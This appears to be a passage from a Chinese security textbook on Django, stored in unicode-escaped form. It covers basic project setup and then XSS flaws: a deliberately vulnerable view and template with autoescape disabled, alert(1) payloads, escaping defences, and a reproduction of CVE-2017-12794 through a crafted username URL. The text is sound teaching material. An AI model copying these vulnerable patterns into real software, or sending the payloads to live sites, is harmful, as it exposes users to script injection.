HttpRequest\u5BF9\u8C61\u7531Django\u81EA\u52A8\u521B\u5EFA\uFF0C\u4F46\u662F\uFF0CHttpResponse\u5BF9\u8C61\u5FC5\u987B\u7531\u5F00\u53D1\u8005\u81EA\u5DF1\u521B\u5EFA\u3002\u6BCF\u4E2AView\u8BF7\u6C42\u5904\u7406\u65B9\u6CD5\u5FC5\u987B\u8FD4\u56DE\u4E00\u4E2AHttpResponse\u5BF9\u8C61\u3002\u8BE5\u5BF9\u8C61\u4E3B\u8981\u5305\u62EC\uFF1Arender\u548Credirect\u65B9\u6CD5\u3002\r
\r
l render\u65B9\u6CD5\uFF1A\u7528\u6237\u5411\u524D\u53F0\u9875\u9762\u8FDB\u884C\u6E32\u67D3\uFF0C\u63A5\u53D7\u4E00\u4E2A\u5F85\u6E32\u67D3\u7684\u6A21\u677F\u6587\u4EF6\u548C\u4E00\u4E2A\u4FDD\u5B58\u5177\u4F53\u6570\u636E\u7684\u5B57\u5178\u53C2\u6570\u3002\u5C06\u6570\u636E\u586B\u5145\u8FDB\u6A21\u677F\u6587\u4EF6\uFF0C\u6700\u540E\u628A\u7ED3\u679C\u8FD4\u56DE\u7ED9\u6D4F\u89C8\u5668\u3002\r
\r
l redirect\u65B9\u6CD5\uFF1A\u7528\u4E8EHTTP\u7684\u8BF7\u6C42\u91CD\u5B9A\u5411\uFF0C\u63A5\u53D7\u4E00\u4E2AURL\u53C2\u6570\uFF0C\u8868\u793A\u8DF3\u8F6C\u5230\u6307\u5B9A\u7684URL\u3002\r
\r
\\5. Django\u4E2Dmanage.py\u811A\u672C\u4F7F\u7528\r
\r
Django\u7684manage.py\u6587\u4EF6\u662F\u9879\u76EE\u7BA1\u7406\u6587\u4EF6\uFF0C\u7528\u6237\u53EF\u901A\u8FC7\u8BE5\u811A\u672C\u6587\u4EF6\u7BA1\u7406\u9879\u76EE\uFF0C\u5305\u62EC\uFF1A\u542F\u52A8\u670D\u52A1\u5668\u3001\u65B0\u5EFAapp\u3001\u6570\u636E\u6539\u52A8\u4E0E\u66F4\u65B0\u3001\u521B\u5EFA\u7BA1\u7406\u5458\u7B49\u64CD\u4F5C\uFF0C\u8BE5\u6587\u4EF6\u7684\u5E38\u7528\u547D\u4EE4\u5305\u62EC\uFF1A\r
\r
\uFF081\uFF09  \u542F\u52A8\u670D\u52A1\u5668\r
\r
\r
\r
//\u542F\u52A8\u670D\u52A1\u5668\uFF0C\u9ED8\u8BA4ip\u548C\u7AEF\u53E3\u4E3Ahttp://127.0.0.1:8000\r
\r
python manage.py runserver ip:port\r
\r
\r
\r
\uFF082\uFF09  \u65B0\u5EFAapp\r
\r
\r
\r
python manage.py startapp appname //\u65B0\u5EFA\u540D\u79F0\u4E3Aappname\u7684app\u5E94\u7528\r
\r
\r
\r
\uFF083\uFF09  \u663E\u793A\u5E76\u8BB0\u5F55\u6240\u6709\u6570\u636E\u7684\u6539\u52A8\r
\r
\r
\r
python manage.py makemigrations\r
\r
\r
\r
\uFF084\uFF09  \u5C06\u6539\u52A8\u66F4\u65B0\u5230\u6570\u636E\u5E93\r
\r
\r
\r
python manage.py migrate\r
\r
\r
\r
\uFF085\uFF09  \u521B\u5EFA\u8D85\u7EA7\u7BA1\u7406\u5458\r
\r
\r
\r
python manage.py createsuperuser\r
\r
\r
\r
### 14.1.2 \u5B9E\u9A8C\uFF1ADjango\u642D\u5EFA\r
\r
\xB7 \u5B9E\u9A8C\u4ECB\u7ECD\r
\r
\u672C\u5B9E\u9A8C\u5C06\u5C06\u5728\u5B9E\u9A8C\u73AF\u5883\u4E2D\u8FDB\u884CDjango\u73AF\u5883\u7684\u642D\u5EFA\u3002\r
\r
\xB7 \u9884\u5907\u77E5\u8BC6\r
\r
\u53C2\u800314.1.1\u8282\uFF1ADjango\u6846\u67B6\u7B80\u4ECB\u3002\r
\r
\xB7 \u5B9E\u9A8C\u76EE\u7684\r
\r
\u638C\u63E1Django\u7684\u5B89\u88C5\u4E0E\u642D\u5EFA\u65B9\u6CD5\uFF0C\u4E86\u89E3Django MTV\u6846\u67B6\u3002\r
\r
\xB7 \u5B9E\u9A8C\u6B65\u9AA4\r
\r
\uFF081\uFF09  \u51C6\u5907\u5DE5\u4F5C\r
\r
\u5728\u5B89\u88C5Django\u6846\u67B6\u524D\uFF0C\u9700\u8981\u5BF9\u5B89\u88C5\u73AF\u5883\u8FDB\u884C\u51C6\u5907\u5DE5\u4F5C\uFF0C\u9700\u8981\u786E\u4FDD\u7684\u6761\u4EF6\u5305\u62EC\uFF1A\u662F\u5426\u5B89\u88C5Python\u3001\u662F\u5426\u5B89\u88C5pip\u3002\r
\r
l \u68C0\u67E5Python\u5B89\u88C5\u60C5\u51B5\r
\r
\r
\r
python \u2013v  //\u6253\u5370python\u7248\u672C\u53F7\r
\r
\r
\r
\u4E0A\u8FF0\u547D\u4EE4\u6267\u884C\u540E\uFF0C\u82E5\u6253\u5370python\u7248\u672C\u53F7\uFF0C\u5219\u8BF4\u660E\u8BE5\u5B9E\u9A8C\u73AF\u5883\u5DF2\u7ECF\u5B89\u88C5python\u73AF\u5883\u3002\u82E5\u6CA1\u6709\u5B89\u88C5\u5219\u4F7F\u7528apt-get\u547D\u4EE4\u5B89\u88C5python\u73AF\u5883\u3002\r
\r
\r
\r
$ sudo apt-get update       //\u66F4\u65B0\r
\r
$ sudo apt-get install python3  //\u5B89\u88C5python3\r
\r
\r
\r
l \u68C0\u67E5pip\u5B89\u88C5\u60C5\u51B5\r
\r
\r
\r
$ sudo apt-get install python3-pip  //\u5B89\u88C5python3-pip\r
\r
$ pip3 install --upgrade pip     //\u5347\u7EA7pip\r
\r
$ pip \u2013V               //\u67E5\u770Bpip\u7248\u672C\u53F7\r
\r
\r
\r
\u4E0A\u8FF0\u547D\u4EE4\u6267\u884C\u540E\uFF0C\u82E5\u6253\u5370pip\u7248\u672C\u53F7\uFF0C\u5219\u8BF4\u660E\u8BE5\u5B9E\u9A8C\u73AF\u5883\u5DF2\u7ECF\u5B89\u88C5pip\u73AF\u5883\u3002\r
\r
\uFF082\uFF09  \u5B89\u88C5Django\u73AF\u5883\r
\r
\u4F7F\u7528pip\u5B89\u88C5Django\u73AF\u5883\uFF0C\u9700\u6267\u884C\u7684\u547D\u4EE4\u4E3A\uFF1A\r
\r
\r
\r
$ pip install django          //\u5B89\u88C5Django\u6846\u67B6\r
\r
\r
\r
\uFF083\uFF09  \u521B\u5EFA\u5E76\u8FD0\u884CDjango\u9879\u76EE\r
\r
\u4F7F\u7528Django\u4E2D\u7684djang-admin.py\u6587\u4EF6\u548Cmanage.py\u6587\u4EF6\u521B\u5EFA\u5E76\u8FD0\u884C\u540D\u4E3AMyTestSite\u7684\u9879\u76EE\uFF0C\u5F85\u6267\u884C\u7684\u547D\u4EE4\uFF1A\r
\r
\r
\r
$ mkdir workspace\r
\r
$ cd workspace\r
\r
$ django-admin.py startproject MyTestSite //\u521B\u5EFA\u540D\u4E3AMyTestSite\u7684\u9879\u76EE\r
\r
$ python3 manage.py runserver       //\u542F\u52A8Django\u9879\u76EE\r
\r
\r
\r
\uFF084\uFF09  \u672C\u5730\u4E0E\u8FDC\u7A0B\u8BBF\u95EE\u914D\u7F6E\r
\r
  \u521B\u5EFA\u7684Django\u9879\u76EE\u53EF\u76F4\u63A5\u5728\u672C\u5730\u8FDB\u884C\u8BBF\u95EE\uFF0C\u5BF9\u4E8E\u8FDC\u7A0B\u8BBF\u95EE\u800C\u8A00\u5219\u9700\u8981\u5BF9\u90E8\u5206\u6587\u4EF6\u8FDB\u884C\u914D\u7F6E\uFF0C\u4FEE\u6539MyTestSite/MyTestSite/setting.py\uFF0C\u5C06ALLOWED_HOSTS \u6539\u4E3A ALLOWED_HOSTS = ['*', ]\uFF0C\u5373\u5141\u8BB8\u4EFB\u610F\u4E3B\u673A\u8BBF\u95EE\u8BE5\u9879\u76EE\uFF0C\u5E76\u4F7F\u7528\u547D\u4EE4\u542F\u52A8\u5373\u53EF\u3002\r
\r
\r
\r
$ python3 manage.py runserver 0.0.0.0:9999  //\u5F00\u542F9999\u7AEF\u53E3\u542F\u52A8\u9879\u76EE\r
\r
\r
\r
\u4E3B\u673A\u8BBF\u95EE\u5730\u5740http://IP:9999/\u67E5\u770B\u9879\u76EE\u542F\u52A8\u60C5\u51B5\uFF0C\u5982\u56FE14-4\u6240\u793A\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image646.gif)\r
\r
\u56FE14-4 Django\u9879\u76EE\u9875\u9762\u56FE\r
\r
\uFF085\uFF09  \u521B\u5EFA\u8D85\u7EA7\u7528\u6237\u767B\u5F55\u540E\u53F0\r
\r
\u521B\u5EFA\u7528\u6237\u7BA1\u7406\u540E\u53F0\u9879\u76EE\u7684\u7528\u6237\uFF0C\u7528\u6237\u540D\u4E3Acollege\uFF0C\u5BC6\u7801\u4E3A360College\u3002\r
\r
\r
\r
$ python3 manage.py createsuperuser  //\u521B\u5EFA\u8D85\u7EA7\u7528\u6237\r
\r
\r
\r
  \u542F\u52A8Django\u9879\u76EE\u8FDB\u884C\u540E\u53F0\u7BA1\u7406\u3002\r
\r
\r
\r
$ python3 manage.py runserver 0.0.0.0:9999  //\u5F00\u542F9999\u7AEF\u53E3\u542F\u52A8\u9879\u76EE\r
\r
\r
\r
\u8BBF\u95EE\u7684\u540E\u53F0\u7BA1\u7406\u7CFB\u7EDFhttp://your-ip:9999/admin\uFF0C\u5E76\u8F93\u5165\u7528\u6237\u540D\u5BC6\u7801\u8FDB\u884C\u767B\u5F55\u7BA1\u7406\uFF0C\u56FE14-5\u4E3ADjango\u540E\u53F0\u7BA1\u7406\u754C\u9762\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image648.jpg)\r
\r
\u56FE14-5 Django\u540E\u53F0\u7BA1\u7406\u9875\u9762\r
\r
## 14.2 Django\u6846\u67B6\u5E38\u89C1\u6F0F\u6D1E\r
\r
### 14.2.1 Django\u4E2D\u7684XSS\u6F0F\u6D1E\r
\r
\\1. Django\u7684XSS\u6F0F\u6D1E\u7B80\u4ECB\r
\r
Django\u4E2DXSS\u653B\u51FB\u5C31\u662F\u8DE8\u7AD9\u811A\u672C\u653B\u51FB\uFF0C\u5C31\u662F\u5229\u7528HTML\u5BF9\u9875\u9762\u8FDB\u884C\u6076\u610F\u7684\u6807\u7B7E\u6E32\u67D3\uFF0C\u4ECE\u800C\u8FBE\u5230\u653B\u51FB\u7F51\u7AD9\u7684\u6548\u679C\uFF0C\u66F4\u4E25\u91CD\u7684\u60C5\u51B5\u662F\u76F4\u63A5\u83B7\u53D6\u7528\u6237\u4FE1\u606F\uFF0C\u5BF9\u7F51\u7AD9\u9020\u6210\u5DE8\u5927\u635F\u5931\u3002\r
\r
Django\u6846\u67B6\u9ED8\u8BA4\u8FDB\u884C\u4E86XSS\u6F0F\u6D1E\u7684\u9632\u62A4\uFF0C\u6211\u4EEC\u53EF\u4EE5\u4E0D\u5FC5\u523B\u610F\u505A\u8FD9\u4E9B\u4FDD\u62A4\u3002\u4F46\u662F\u5728\u8FDB\u884C\u4EE3\u7801\u5BA1\u8BA1\u8FC7\u7A0B\u4E2D\uFF0C\u9700\u8981\u7740\u91CD\u5BA1\u8BA1\u5728\u8C03\u7528\u6216\u89E3\u9664XSS\u9632\u62A4\u9650\u5236\u65F6\u7684\u53C2\u6570\u4F20\u9012\u53CA\u4FDD\u62A4\u8FC7\u7A0B\uFF0C\u4EE5\u9632XSS\u6F0F\u6D1E\u3002\r
\r
\u5BF9Django\u6846\u67B6\u4EE3\u7801\u8FDB\u884C\u5BA1\u8BA1\u8FC7\u7A0B\u4E2D\uFF0C\u53EF\u80FD\u5B58\u5728XSS\u6F0F\u6D1E\u7684\u5E38\u89C1\u60C5\u51B5\u5305\u62EC\uFF1A\r
\r
l \u524D\u53F0\u9875\u9762\u5C5E\u6027\u4E2D\u6709\u52A8\u6001\u5185\u5BB9\uFF0C\u5982<img alt={{foo}}>\uFF1B\r
\r
l \u4F7F\u7528safe\u3001mark_safe\u3001autoescape\u7528\u4E8E\u5173\u95ED\u81EA\u52A8\u8F6C\u4E49\uFF1B\r
\r
l \u5B58\u5728DOM\u7C7B\u578BXSS\uFF08\u53EF\u5BF9\u524D\u53F0\u4EE3\u7801\u518D\u8FDB\u884Cencode\u7F16\u7801\u8FDB\u884C\u9632\u5FA1\uFF09\uFF1B\r
\r
l HttpResponse\u8FD4\u56DE\u52A8\u6001\u5185\u5BB9\uFF0C\u5982\uFF1Areturn HttpResponse(\u2018hello %s\u2019 %(name))\r
\r
2.Django\u4E2D\u7684\u8F6C\u4E49\r
\r
\u8F6C\u4E49\u5C31\u662F\u628AHTML\u8BED\u8A00\u4E2D\u7684\u5173\u952E\u5B57\u8FDB\u884C\u8FC7\u6EE4\u3002\u4F8B\u5982\uFF1A<div>\u6807\u7B7E\u7ECF\u8FC7\u8F6C\u4E49\u540E\uFF0C\u5176\u4EE3\u7801\u5C06\u662F&lt;div&gt;\u8F6C\u4E49\u5176\u5B9E\u5C31\u662F\u628AHTML\u4EE3\u7801\u8F6C\u6362\u6210HTML\u5B9E\u4F53\u3002\u9ED8\u8BA4\u60C5\u51B5\u4E0B\uFF0CDjango\u81EA\u52A8\u4E3A\u5F00\u53D1\u8005\u63D0\u4F9B\u81EA\u52A8\u8F6C\u4E49\uFF08escape\uFF09\u529F\u80FD\u3002\r
\r
\u5173\u95EDDjang\u4E2D\u6A21\u677F\u81EA\u52A8\u8F6C\u4E49\u529F\u80FD\u7684\u65B9\u6CD5\u5305\u62EC\uFF1A\r
\r
l \u4F7F\u7528filter safe\u5173\u95ED\r
\r
\r
\r
{{data|safe}}\r
\r
\r
\r
l \u4F7F\u7528autoescape\u6807\u7B7E\r
\r
\r
\r
{% autoescape off %}\r
\r
\u200B    This will not be auto-escaped: {{ data }}.\r
\r
{% endautoescape %}\r
\r
\r
\r
l \u4F7F\u7528mark_safe\u51FD\u6570\r
\r
\r
\r
from django.utils.safestring import mark_safe\r
\r
def get_username(self):\r
\r
\u200B      return **mark_safe**(\u201D<a href=\u2019/accounts/%s/\u2019>%s</a>\u201D %(self.user.id, self.user.username))\r
\r
\r
\r
\\3. Django\u4E2DXSS\u6F0F\u6D1E\u6848\u4F8B\r
\r
\u901A\u8FC7POST\u65B9\u6CD5\u4F20\u9012\u53C2\u6570\uFF0C\u5C06\u53C2\u6570\u663E\u793A\u5230\u524D\u53F0\u9875\u9762\uFF0C\u4E0B\u9762\u7ED9\u51FAviews.py\u4EE3\u7801\u5982\u4E0B\uFF1A\r
\r
\r
\r
def index(request):\r
\r
\u200B    if request.method == 'GET':\r
\r
\u200B      return render(request,'index.html')\r
\r
\u200B     else:\r
\r
\u200B       info = request.POST.get('info')\r
\r
\u200B      return render(**request,'index.html',{"value":info}**)\r
\r
\r
\r
\u524D\u53F0\u9875\u9762index.html\u4EE3\u7801\u5982\u4E0B\uFF1A\r
\r
\r
\r
<h1>Hello, Django!</h1>\r
\r
<h2>**{{ value }}**</h2>\r
\r
\r
\r
\u8BE5Web\u5E94\u7528\u901A\u8FC7\u8BBF\u95EE\u540E\uFF0C\u4F7F\u7528Post\u65B9\u6CD5\u4F20\u9012\u53C2\u6570\u4E3Ainfo=<script>alert(1)<\/script>\u5176\u9875\u9762\u663E\u793A\u5982\u56FE14-6\u6240\u793A\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image650.gif)\r
\r
\u56FE14-6 XSS\u6F0F\u6D1E\u6D4B\u8BD5\u56FE\r
\r
\u5F53\u5173\u95EDDjango\u6846\u67B6\u4E2D\u7684\u81EA\u52A8\u8F6C\u4E49\u529F\u80FD\u540E\uFF0C\u6210\u529F\u89E6\u53D1XSS\u653B\u51FB\u6548\u679C\uFF0C\u4E0B\u9762\u7ED9\u51FA\u5B58\u5728\u6F0F\u6D1E\u7684\u4E24\u79CD\u60C5\u51B5\uFF1A\r
\r
l autoescape\u5173\u95ED\uFF1A\r
\r
\r
\r
{% autoescape off %}\r
\r
<h2>{{ value }}</h2>\r
\r
{% endautoescape %}\r
\r
\r
\r
l safe\u6D4B\u8BD5\uFF1A\r
\r
\r
\r
<h1>Hello, Django!</h1>\r
\r
<h2>{{ value | safe }}</h2>\r
\r
\r
\r
  \u89E6\u53D1\u7684XSS\u6F0F\u6D1E\u5F39\u6846\u6548\u679C\u5982\u56FE14-7\u6240\u793A\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image652.gif)\r
\r
\u56FE14-7 XSS\u6F0F\u6D1E\u6D4B\u8BD5\u56FE\r
\r
4.Django\u4E2DXSS\u6F0F\u6D1E\u9632\u5FA1\r
\r
\u53EF\u4F7F\u7528Django\u4E2D\u7684CGI\u51FD\u6570\u7684escape\u65B9\u6CD5\u5BF9\u7528\u6237\u4F20\u9012\u7684\u53C2\u6570\u503C\u8FDB\u884C\u5B9E\u4F53\u7F16\u7801\u8F6C\u4E49\uFF0C\u4E0B\u9762\u7ED9\u51FA\u9632\u5FA1\u4EE3\u7801\u3002\r
\r
\r
\r
import cgi\r
\r
def index(request):\r
\r
  if request.method == 'GET':\r
\r
\u200B    return render(request,'index.html')\r
\r
  else:\r
\r
\u200B    info = request.POST.get('info')\r
\r
\u200B    **info = cgi.escape(info)**\r
\r
\u200B    return **render(request,'index.html',{"value":info})**\r
\r
\r
\r
\u4F7F\u7528CGI\u6A21\u5757\u65F6\u9700\u8981\u6CE8\u610F\u7684\u662Fescape\u51FD\u6570\u7684\u7B2C\u4E8C\u4E2A\u53C2\u6570\u503C\u8BBE\u7F6E\u4E3A\u201CTrue\u201D\uFF0C\u4ECE\u800C\u5C3D\u53EF\u80FD\u591A\u7684\u8F6C\u4E49\u5B57\u7B26\uFF0C\u6D4B\u8BD5\u8FC7\u7A0B\u5982\u4E0B\u6240\u793A\u3002\r
\r
\r
\r
\\>>> import cgi\r
\r
\\>>> a='<script>alert(1)<\/script>'\r
\r
\\>>> cgi.escape(a)\r
\r
'&lt;script&gt;alert(1)&lt;/script&gt;' //\u6210\u5C06\u811A\u672C\u8FDB\u884C\u5B9E\u4F53\u7F16\u7801\u8F6C\u4E49\u6210\u529F\r
\r
\\>>> b='" onload=alert(1)'\r
\r
\\>>> cgi.escape(b)\r
\r
'" onload=alert(1)'    //\u5C06\u811A\u672C\u8FDB\u884C\u5B9E\u4F53\u7F16\u7801\u8F6C\u4E49\u5931\u8D25\r
\r
\\>>> cgi.escape(b,True)   //escape\u51FD\u6570\u7684\u7B2C\u4E8C\u4E2A\u53C2\u6570\u8BBE\u7F6E\u4E3ATrue\r
\r
'&quot; onload=alert(1)'  //\u5C06\u811A\u672C\u8FDB\u884C\u5B9E\u4F53\u7F16\u7801\u8F6C\u4E49\u6210\u529F\r
\r
\r
\r
### 14.2.2 Django\u7684XSS\u6848\u4F8B\r
\r
Django\u4E8E2017\u5E74\u66FE\u51FA\u73B0CVE-2017-12794\u6F0F\u6D1E\uFF0C\u5176\u662FDjango1.10.8\u4E4B\u524D\u7248\u672C\u548C1.11.5\u4E4B\u524D\u76841.11.x\u7248\u672C\u4E2D\u51FA\u73B0\u7684\u6F0F\u6D1E\uFF0C\u5728\u54CD\u5E94\u9875\u9762\u4E3A500\u72B6\u6001\u7801\u65F6\u5B58\u5728\u7684\u5B58\u50A8\u578BXSS\u5B89\u5168\u6F0F\u6D1E\uFF0C\u8BE5\u6F0F\u6D1E\u6E90\u4E8E\u7A0B\u5E8F\u6CA1\u6709\u6B63\u786E\u7684\u8FC7\u6EE4\u7528\u6237\u63D0\u4EA4\u7684\u8F93\u5165\uFF0C\u4F7F\u5F97\u8FDC\u7A0B\u653B\u51FB\u8005\u53EF\u5229\u7528\u8BE5\u6F0F\u6D1E\u5728\u6D4F\u89C8\u5668\u4E2D\u6267\u884C\u4EFB\u610F\u811A\u672C\u4EE3\u7801\u3002\r
\r
\\1. \u6F0F\u6D1E\u8865\u4E01\u5206\u6790\r
\r
Django\u53D1\u5E03\u76841.11.5\u7248\u672C\u4E2D\uFF0C\u4FEE\u590D\u4E86500\u9875\u9762\u4E2D\u5B58\u5728\u7684\u5B58\u50A8\u578BXSS\u6F0F\u6D1E\uFF0C\u5B58\u5728\u8BE5\u6F0F\u6D1E\u7684\u9875\u9762\u6587\u4EF6\u662Fdjango/views/debug.py\u3002\u5C06Django\u4E2D1.11.4\u548C1.11.5\u7248\u672C\u8FDB\u884C\u6BD4\u8F83\uFF0C\u5206\u6790\u4E24\u4E2A\u7248\u672C\u7684\u533A\u522B\uFF0C\u5BF9\u6BD4\u7ED3\u679C\u5982\u56FE12-8\u6240\u793A\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image654.jpg)\r
\r
\u56FE14-8 Django\u4E0D\u540C\u7248\u672C\u5BF9\u6BD4\u56FE\r
\r
  \u4ECE\u4E0A\u56FE\u53EF\u77E5\uFF0C\u5176\u5728\u4E24\u5904\u589E\u52A0\u4E86\u5F3A\u5236\u8F6C\u4E49\u201Cforce_escape\u201D\uFF0C\u4ECE\u800C\u4FEE\u590D\u4E86\u539F\u7248\u672C\u4E2D\u7684\u5B58\u50A8\u578BXSS\u6F0F\u6D1E\u3002\r
\r
\\2. \u6F0F\u6D1E\u5206\u6790\r
\r
\u8BE5\u6F0F\u6D1E\u51FA\u73B0\u7684\u60C5\u51B5\u662F\u5F53\u6253\u5370\u201CThe above exception {{frame.exc_cause}} was the direct cause of the following exception\u201D\u65F6\uFF0C\u5C06\u5F02\u5E38\u6253\u5370\u81F3\u524D\u53F0\u9875\u9762\u5219\u53EF\u80FD\u51FA\u73B0XSS\u6F0F\u6D1E\u3002\u540C\u65F6\uFF0C\u89E6\u53D1\u8BE5\u6F0F\u6D1E\u7684\u6761\u4EF6\u8FD8\u9700\u8981\u8FDB\u5165\u4E24\u4E2Aif\u8BED\u53E5\uFF0C\u5206\u522B\u662F{% ifchanged frame.exc_cause %}\u548C{% if frame.exc_cause %}\u3002\r
\r
\u90A3\u4E48\u6B64\u7C7B\u62A5\u9519\u4FE1\u606F\u51FA\u73B0\u7684\u60C5\u51B5\u662F\u4EC0\u4E48\u5462\uFF1F\u5BF9\u4E8EDjango\u800C\u8A00\uFF0C\u4E00\u822C\u5728\u6570\u636E\u5E93\u629B\u5F02\u5E38\u7684\u65F6\u5019\uFF0C\u4F1A\u5728\u9875\u9762\u6253\u5370\u8FD9\u6837\u7684\u9519\u8BEF\u8BED\u53E5\u3002\u8FD9\u4E3B\u8981\u662F\u4E3A\u4E86\u65B9\u4FBF\u5F00\u53D1\u8005\u8FDB\u884CSQL\u9519\u8BEF\u7684\u8C03\u8BD5\uFF0C\u56E0\u4E3ADjango\u7684\u6A21\u578B\u6700\u7EC8\u662F\u64CD\u4F5C\u6570\u636E\u5E93\uFF0C\u6570\u636E\u5E93\u4E2D\u5177\u4F53\u51FA\u73B0\u7684\u9519\u8BEF\uFF0C\u662FDjango\u65E0\u6CD5\u51C6\u786E\u9884\u6D4B\u7684\u3002\u90A3\u4E48\uFF0C\u4E3A\u4E86\u65B9\u4FBF\u5F00\u53D1\u8005\u5FEB\u901F\u627E\u5230\u662F\u54EA\u4E2A\u64CD\u4F5C\u89E6\u53D1\u4E86\u6570\u636E\u5E93\u5F02\u5E38\uFF0C\u5C31\u9700\u8981\u5C06\u8FD9\u4E24\u4E2A\u5F02\u5E38\u56DE\u6EAF\u6808\u5173\u8054\u5230\u4E00\u5757\u3002\r
\r
\r
\r
def __exit__(self, exc_type, exc_value, traceback):\r
\r
  if exc_type is None:\r
\r
\u200B    return\r
\r
  for dj_exc_type in (\r
\r
\u200B      **DataError,**\r
\r
\u200B      **OperationalError,**\r
\r
\u200B      **IntegrityError,**\r
\r
\u200B      **InternalError,**\r
\r
\u200B      **ProgrammingError,**\r
\r
\u200B      **NotSupportedError,**\r
\r
\u200B      **DatabaseError,**\r
\r
\u200B      **InterfaceError,**\r
\r
\u200B      **Error,**\r
\r
  ):\r
\r
\u200B    db_exc_type = getattr(self.wrapper.Database, dj_exc_type.__name__)\r
\r
\u200B     **if issubclass(exc_type, db_exc_type):**\r
\r
\u200B      dj_exc_value = dj_exc_type(*exc_value.args)\r
\r
\u200B      **dj_exc_value.__cause__ = exc_value**\r
\r
\u200B      if not hasattr(exc_value, '__traceback__'):\r
\r
\u200B        **exc_value.__traceback__ = traceback**\r
\r
\u200B      if dj_exc_type not in (DataError, IntegrityError):\r
\r
\u200B        self.wrapper.errors_occurred = True\r
\r
\u200B      six.reraise(dj_exc_type, dj_exc_value, traceback)\r
\r
\r
\r
\u5176\u4E2Dexc_type\u662F\u5F02\u5E38\uFF0C\u5982\u679C\u5176\u7C7B\u578B\u662FDataError\u3001OperationalError\u3001IntegrityError\u3001InternalError\u3001ProgrammingError\u3001NotSupportedError\u3001DatabaseError\u3001InterfaceError\u3001Error\u4E4B\u4E00\uFF0C\u5219\u629B\u51FA\u4E00\u4E2A\u540C\u7C7B\u578B\u7684\u65B0\u5F02\u5E38\uFF0C\u5E76\u8BBE\u7F6E\u5176__cause__\u548C__traceback__\u4E3A\u6B64\u65F6\u4E0A\u4E0B\u6587\u7684exc_value\u548Ctraceback\u3002exc_value\u662F\u4E0A\u4E00\u4E2A\u5F02\u5E38\u7684\u8BF4\u660E\uFF0Ctraceback\u662F\u4E0A\u4E00\u4E2A\u5F02\u5E38\u7684\u56DE\u6EAF\u6808\u3002\u8FD9\u4E2A\u51FD\u6570\u5176\u5B9E\u5C31\u662F\u5173\u8054\u4E86\u4E0A\u4E00\u4E2A\u5F02\u5E38\u548C\u5F53\u524D\u7684\u65B0\u5F02\u5E38\u3002\u6700\u540E\uFF0C\u5728500\u9875\u9762\u4E2D__cause__\u88AB\u8F93\u51FA\u3002\r
\r
\\3. \u6F0F\u6D1E\u590D\u73B0\r
\r
Django\u4F7F\u7528\u7684PostgreSQL\u6570\u636E\u5E93\u5728\u89E6\u53D1\u5F02\u5E38\u65F6\uFF0C\u4F1A\u5C06\u5B57\u6BB5\u540D\u548C\u5B57\u6BB5\u503C\u5168\u90E8\u629B\u51FA\u3002\u90A3\u4E48\uFF0C\u5982\u679C\u5B57\u6BB5\u503C\u4E2D\u5305\u542B\u653B\u51FB\u8005\u53EF\u63A7\u7684\u5B57\u7B26\u4E32\uFF0C\u53C8\u7531\u4E0A\u6587\u4E2D\u63D0\u5230\u7684\uFF0C\u8BE5\u5B57\u7B26\u4E32\u5176\u5B9E\u5C31\u4F1A\u88AB\u8BBE\u7F6E\u6210__cause__\uFF0C\u6700\u540E\u88AB\u663E\u793A\u5728\u9875\u9762\u4E2D\u3002\r
\r
\u7ED9\u51FA\u6F0F\u6D1E\u590D\u73B0\u7684\u573A\u666F\uFF1A\r
\r
l \u7528\u6237\u6CE8\u518C\u9875\u9762\uFF0C\u672A\u68C0\u67E5\u7528\u6237\u540D\uFF1B\r
\r
l \u6CE8\u518C\u4E00\u4E2A\u7528\u6237\u540D\u4E3A<script>alert(1)<\/script>\u7684\u7528\u6237\uFF1B\r
\r
\u8BBF\u95EE http://your-ip:8000/create_user/?username=<scRiPt>alert(1)<\/scRiPt>\u3002\u8BBF\u95EE\u65F6\u9009\u7528firefox\u6D4F\u89C8\u5668\u8FDB\u884C\u6D4B\u8BD5\uFF0C\u5982\u56FE12-9\u6240\u793A\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image656.jpg)\r
\r
\u56FE14-9 XSS\u6F0F\u6D1E\u590D\u73B0\u56FE1\r
\r
l \u518D\u6B21\u6CE8\u518C\u4E00\u4E2A\u7528\u6237\u540D\u4E3A<script>alert(1)<\/script>\u7684\u7528\u6237\r
\r
\u518D\u6B21\u8BBF\u95EEhttp://IP:8000/create_user/?username=<scRiPt>alert(1)<\/scRiPt>\u89E6\u53D1duplicate key\u5F02\u5E38\u60C5\u51B5\uFF0C\u5E76\u5C06\u9519\u8BEF\u6253\u5370\u503C\u524D\u53F0\u9875\u9762\u4ECE\u800C\u5F39\u6846\uFF0C\u5982\u56FE12-10\u6240\u793A\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image658.gif)\r
\r
\u56FE14-10 XSS\u6F0F\u6D1E\u590D\u73B0\u56FE2\r
\r
### 14.2.3 Django\u4E2D\u7684CSRF\u6F0F\u6D1E\r
\r
Django\u7684\u9632\u5FA1CSRF\u6F0F\u6D1E\u7684\u673A\u5236\u6709\u4E09\u79CD\uFF0C\u5176\u5305\u62EC\uFF1A\u4E2D\u95F4\u4EF6CsrfViewMiddleware\u3001csrfToken\u3001X-CSRFToken\u8BF7\u6C42\u5934\u3002\r
\r
\uFF081\uFF09\u670D\u52A1\u7AEF\u4F7F\u7528\u4E2D\u95F4\u4EF6CsrfViewMiddleware\u9A8C\u8BC1\r
\r
Django\u9ED8\u8BA4\u52A0\u5165\u4E86\u4E2D\u95F4\u4EF6django.middleware.csrf.CsrfViewMiddleware\u4E3A\u7528\u6237\u5B9E\u73B0\u9632\u6B62\u8DE8\u7AD9\u8BF7\u6C42\u4F2A\u9020\u7684\u529F\u80FD\uFF0C\u5C06\u8BE5\u914D\u7F6E\u5199\u5165\u5230settings.py\u5373\u53EF\u5B8C\u6210\u3002Django\u4E2D\u9632\u8DE8\u7AD9\u8BF7\u6C42\u4F2A\u9020\u529F\u80FD\u6709\u5206\u4E3A\u5168\u5C40\u548C\u5C40\u90E8\u3002\r
\r
l \u5168\u5C40\uFF1A\r
\r
